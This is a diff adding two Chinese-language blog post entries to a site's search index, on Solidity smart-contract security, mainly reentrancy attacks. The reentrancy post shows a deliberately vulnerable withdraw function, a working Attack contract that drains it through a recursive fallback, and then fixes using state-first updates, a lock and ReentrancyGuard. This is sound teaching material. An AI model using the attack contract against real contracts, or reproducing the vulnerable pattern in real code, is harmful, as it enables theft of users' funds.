@@ -10243,4 +10243,60 @@
         <tag>openzeppelin</tag>
       </tags>
   </entry>
+  <entry>
+    <title>solidity编程安全</title>
+    <url>/2024/11/28/blockchain/ethereum/solidity-security/</url>
+    <content><![CDATA[<p>在编写 Solidity 智能合约时，安全性是最重要的考虑因素之一。以下是开发中常见的安全问题及其解决方法：</p>
+<h1 id="重入攻击（Reentrancy-Attack）"><a href="#重入攻击（Reentrancy-Attack）" class="headerlink" title="重入攻击（Reentrancy Attack）"></a>重入攻击（Reentrancy Attack）</h1><p><a href="https://zhoubofsy.github.io/2024/11/28/blockchain/ethereum/solidity-security-reentrancy-attack/">https://zhoubofsy.github.io/2024/11/28/blockchain/ethereum/solidity-security-reentrancy-attack/</a></p>
+<h1 id="溢出与下溢（Overflow-and-Underflow）"><a href="#溢出与下溢（Overflow-and-Underflow）" class="headerlink" title="溢出与下溢（Overflow and Underflow）"></a>溢出与下溢（Overflow and Underflow）</h1>]]></content>
+      <categories>
+        <category>blockchain</category>
+      </categories>
+      <tags>
+        <tag>solidity</tag>
+        <tag>security</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>重入攻击</title>
+    <url>/2024/11/28/blockchain/ethereum/solidity-security-reentrancy-attack/</url>
+    <content><![CDATA[<h1 id="重入攻击（Reentrancy-Attack）"><a href="#重入攻击（Reentrancy-Attack）" class="headerlink" title="重入攻击（Reentrancy Attack）"></a>重入攻击（Reentrancy Attack）</h1><p>重入攻击是指攻击者通过调用目标合约的某个函数，利用该函数在完成关键状态变量更新前调用外部合约的能力，从而反复调用目标合约的函数，最终实现非法的资金提取或状态操作。</p>
+<h2 id="漏洞合约"><a href="#漏洞合约" class="headerlink" title="漏洞合约"></a>漏洞合约</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vulnerable &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // 存款函数</span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 提款函数，存在重入攻击漏洞</span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        // 向用户发送资金</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">        // 更新用户余额</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 合约余额</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是一个容易受到重入攻击的合约，它允许用户存款并提款。</p>
+<p><strong>问题:</strong></p>
+<ul>
+<li>在发送资金后，余额更新在后。</li>
+<li>攻击者可以通过调用自己的回调函数，在 withdraw 执行完成前再次调用 withdraw，从而重复提款。</li>
+</ul>
+<h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./Vulnerable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Vulnerable public vulnerable;</span><br><span class="line"></span><br><span class="line">    constructor(address _vulnerableAddress) &#123;</span><br><span class="line">        vulnerable = Vulnerable(_vulnerableAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 回退函数：用于重入攻击</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        if (address(vulnerable).balance &gt;= 1 ether) &#123;</span><br><span class="line">            vulnerable.withdraw(1 ether); // 重复调用</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 攻击函数</span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        require(msg.value &gt;= 1 ether, &quot;Need at least 1 ether&quot;);</span><br><span class="line">        vulnerable.deposit&#123;value: 1 ether&#125;(); // 存款</span><br><span class="line">        vulnerable.withdraw(1 ether);        // 首次提款</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 查看攻击合约余额</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击步骤：</strong></p>
+<ol>
+<li>攻击者部署 Attack 合约并调用 attack。</li>
+<li>调用 vulnerable.withdraw(1 ether) 时触发回退函数 fallback。</li>
+<li>回退函数再次调用 withdraw，在余额未更新之前反复提款。</li>
+</ol>
+<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><ul>
+<li><strong>状态变量优先更新</strong>：在执行外部调用前，先更新合约的状态。</li>
+<li><strong>通过加锁来限制重入</strong>：通过给<code>function</code>加锁，来限制重入，以达到防止攻击的目的。</li>
+</ul>
+<h2 id="状态变量优先更新"><a href="#状态变量优先更新" class="headerlink" title="状态变量优先更新"></a>状态变量优先更新</h2><p>将状态变量的更新移到外部调用之前。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vulnerable &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        // 先更新余额，后转账</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line"></span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="通过加锁来限制重入"><a href="#通过加锁来限制重入" class="headerlink" title="通过加锁来限制重入"></a>通过加锁来限制重入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vulnerable &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // 通过加锁来限制重入</span><br><span class="line">    bool private locker = false;</span><br><span class="line">    modifier locked() &#123;</span><br><span class="line">        require(!locker, &quot;reentrant call&quot;);</span><br><span class="line">        locker = true;</span><br><span class="line">        _;</span><br><span class="line">        locker = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public locked &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也可通过使用OpenZeppelin中提供的<code>ReentrancyGuard</code>工具来防止攻击，<code>ReentrancyGuard</code>机制与锁机制相同。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Vulnerable is ReentrancyGuard &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public nonReentrant &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>blockchain</category>
+      </categories>
+      <tags>
+        <tag>solidity</tag>
+        <tag>security</tag>
+      </tags>
+  </entry>
 </search>
